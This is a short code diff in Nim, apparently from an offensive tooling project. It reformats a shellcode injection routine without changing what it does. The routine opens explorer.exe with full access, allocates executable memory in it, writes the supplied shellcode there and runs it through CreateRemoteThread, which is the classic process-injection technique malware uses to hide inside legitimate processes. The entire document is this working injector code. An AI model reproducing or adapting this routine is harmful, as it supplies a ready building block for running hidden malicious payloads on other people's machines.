@@ -36,26 +36,13 @@ proc createRemoteThread[byte](shellcode: openArray[byte]): void =
     processName: string = "explorer.exe"
     processId = GetProcessbyName(processName)
 
-  let pHandle = OpenProcess(
-        PROCESS_ALL_ACCESS, 
-        false, 
-        cast[DWORD](processId)
-    )
+  let pHandle = OpenProcess(PROCESS_ALL_ACCESS, false, cast[DWORD](processId))
 
   let rPtr = VirtualAllocEx(pHandle, nil, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)
   WriteProcessMemory(pHandle, rPtr, unsafeAddr shellcode, cast[SIZE_T](shellcode.len), addr bytesWritten)
 
-  let tHandle = CreateRemoteThread(
-        pHandle, 
-        NULL,
-        0,
-        cast[LPTHREAD_START_ROUTINE](rPtr),
-        NULL, 
-        0, 
-        NULL
-    )
-
-  defer: CloseHandle(tHandle)
+  let targetHandle = CreateRemoteThread(pHandle, NULL, 0, cast[LPTHREAD_START_ROUTINE](rPtr), NULL, 0, NULL)
+  defer: CloseHandle(targetHandle)
 
 when isMainModule:
   func toByteSeq*(str: string): seq[byte] {.inline.} =
